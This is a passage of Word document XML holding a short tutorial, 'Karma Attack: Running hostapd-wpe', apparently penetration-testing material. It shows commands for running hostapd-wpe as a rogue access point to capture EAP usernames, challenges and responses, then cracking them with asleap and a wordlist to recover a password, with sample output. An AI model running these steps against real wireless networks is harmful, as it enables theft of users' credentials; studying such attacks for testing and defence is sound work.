      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="56"/>
          <w:szCs w:val="56"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="56"/>
          <w:szCs w:val="56"/>
        </w:rPr>
        <w:t>Karma</w:t>
      </w:r>
      <w:r w:rsidRPr="006D3FA1">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="56"/>
          <w:szCs w:val="56"/>
        </w:rPr>
        <w:t xml:space="preserve"> Attack</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="17B1FF2D" w14:textId="22A362D8" w:rsidR="006D3FA1" w:rsidRPr="006D3FA1" w:rsidRDefault="006D3FA1" w:rsidP="006D3FA1">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="56"/>
          <w:szCs w:val="56"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="006D3FA1">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="56"/>
          <w:szCs w:val="56"/>
        </w:rPr>
        <w:t>R</w:t>
      </w:r>
      <w:r w:rsidRPr="006D3FA1">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="56"/>
          <w:szCs w:val="56"/>
        </w:rPr>
        <w:t>unning</w:t>
      </w:r>
      <w:r w:rsidRPr="006D3FA1">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="56"/>
          <w:szCs w:val="56"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="006D3FA1">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="56"/>
          <w:szCs w:val="56"/>
        </w:rPr>
        <w:t>hostapd-wpe</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="22971AD2" w14:textId="77777777" w:rsidR="006D3FA1" w:rsidRPr="006D3FA1" w:rsidRDefault="006D3FA1" w:rsidP="006D3FA1">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="19ECA9FB" w14:textId="77777777"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cd /opt/hostapd-2.2/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="006D3FA1">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>hostapd</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="2741C4CC" w14:textId="77777777" w:rsidR="006D3FA1" w:rsidRPr="006D3FA1" w:rsidRDefault="006D3FA1" w:rsidP="006D3FA1">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="006D3FA1">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>./</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="006D3FA1">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>hostapd-wpe</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="006D3FA1">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="006D3FA1">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>hostapd-wpe.conf</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="21278BF2" w14:textId="77777777" w:rsidR="006D3FA1" w:rsidRPr="006D3FA1" w:rsidRDefault="006D3FA1" w:rsidP="006D3FA1">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0530817C" w14:textId="77777777"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 xml:space="preserve">    With all of that complete, you can run </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="006D3FA1">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>hostapd</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="006D3FA1">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>. The patch will</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="30E418DC" w14:textId="77777777"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 xml:space="preserve">    </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="006D3FA1">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>create</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="006D3FA1">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> a new </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="006D3FA1">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>hostapd-wpe.conf</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="006D3FA1">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>, which you'll likely need to modify</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="399A8D35" w14:textId="77777777"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 xml:space="preserve">    </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="006D3FA1">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>in</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="006D3FA1">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> order to make it work for your attack. Once ready just run</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7928098F" w14:textId="77777777" w:rsidR="006D3FA1" w:rsidRPr="006D3FA1" w:rsidRDefault="006D3FA1" w:rsidP="006D3FA1">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1003B4F4" w14:textId="77777777"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 xml:space="preserve">    </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="006D3FA1">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>hostapd</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="006D3FA1">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="006D3FA1">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>hostapd-wpe.conf</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="7941ADCF" w14:textId="77777777" w:rsidR="006D3FA1" w:rsidRPr="006D3FA1" w:rsidRDefault="006D3FA1" w:rsidP="006D3FA1">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="67B5CEBD" w14:textId="6BCCC38C" w:rsidR="006D3FA1" w:rsidRPr="006D3FA1" w:rsidRDefault="006D3FA1" w:rsidP="006D3FA1">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 </w:t>
      </w:r>
      <w:r w:rsidRPr="006D3FA1">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>Look in the output for the username/challenge/response. It'll be there</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="44C92245" w14:textId="77777777"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 xml:space="preserve">    </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="006D3FA1">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>and</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="006D3FA1">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> in a hostapd-wpe.log file in the directory you ran </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="006D3FA1">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>hostapd</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="006D3FA1">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> from</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="73348356" w14:textId="77777777" w:rsidR="006D3FA1" w:rsidRPr="006D3FA1" w:rsidRDefault="006D3FA1" w:rsidP="006D3FA1">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="409F6504" w14:textId="77777777"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 xml:space="preserve">    </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="006D3FA1">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>for</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="006D3FA1">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> instance here are the EAP-FAST Phase 0 </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="006D3FA1">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>creds</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="006D3FA1">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> from </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="006D3FA1">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>stdout</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="006D3FA1">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3DF31E26" w14:textId="77777777" w:rsidR="006D3FA1" w:rsidRPr="006D3FA1" w:rsidRDefault="006D3FA1" w:rsidP="006D3FA1">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="32D86D86" w14:textId="77777777"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 xml:space="preserve">    </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="006D3FA1">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>username</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="006D3FA1">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">: </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="006D3FA1">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>jdslfkjs</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="33EE7FBA" w14:textId="77777777"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 xml:space="preserve">    </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="006D3FA1">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>challenge</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="006D3FA1">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>: bc:87:6c:48:37:d3:92:6e</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5FA6D870" w14:textId="77777777"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 xml:space="preserve">    </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="006D3FA1">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>response</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="006D3FA1">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>: 2d:00:61:59:56:06:02:dd:35:4a:0f:99:c8:6b:e1:fb:a3:04:ca:82:40:92:7c:f0</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1ECA20AC" w14:textId="77777777" w:rsidR="006D3FA1" w:rsidRPr="006D3FA1" w:rsidRDefault="006D3FA1" w:rsidP="006D3FA1">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4B54341C" w14:textId="77777777"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 xml:space="preserve">    </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="006D3FA1">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>and</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="006D3FA1">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> as always, we feed them into </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="006D3FA1">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>asleap</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="006D3FA1">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> to crack:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="785FF6E7" w14:textId="77777777" w:rsidR="006D3FA1" w:rsidRPr="006D3FA1" w:rsidRDefault="006D3FA1" w:rsidP="006D3FA1">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="148FE8DE" w14:textId="77777777"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 xml:space="preserve">    # </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="006D3FA1">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>asleap</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="006D3FA1">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> -C bc:87:6c:48:37:d3:92:6e -R 2d:00:61:59:56:06:02:dd:35:4a:0f:99:c8:6b:e1:fb:a3:04:ca:82:40:92:7c:f0 -W wordlist </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6FE54451" w14:textId="77777777"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 xml:space="preserve">    </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="006D3FA1">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>asleap</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="006D3FA1">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> 2.2 - actively recover LEAP/PPTP passwords. &lt;</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="006D3FA1">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>jwright@hasborg.com</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="006D3FA1">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="497AD60E" w14:textId="77777777"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 xml:space="preserve">    </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="006D3FA1">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>hash</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="006D3FA1">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> bytes:        b1ca</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0872B008" w14:textId="77777777"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 xml:space="preserve">    NT hash</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="006D3FA1">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>:           e614b958df9df49ec094b8730f0bb1ca</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
    </w:p>
    <w:p w14:paraId="32D7C753" w14:textId="77777777"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 xml:space="preserve">    </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="006D3FA1">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>password</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="006D3FA1">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">:          </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="006D3FA1">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>bradtest</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="1B067945" w14:textId="77777777" w:rsidR="006D3FA1" w:rsidRPr="006D3FA1" w:rsidRDefault="006D3FA1" w:rsidP="006D3FA1">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="626715CB" w14:textId="77777777"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 xml:space="preserve">    Alternatively MSCHAPv2 credentials are outputted in john the rippers NETNTLM format. </w:t>
      </w:r>
    </w:p>
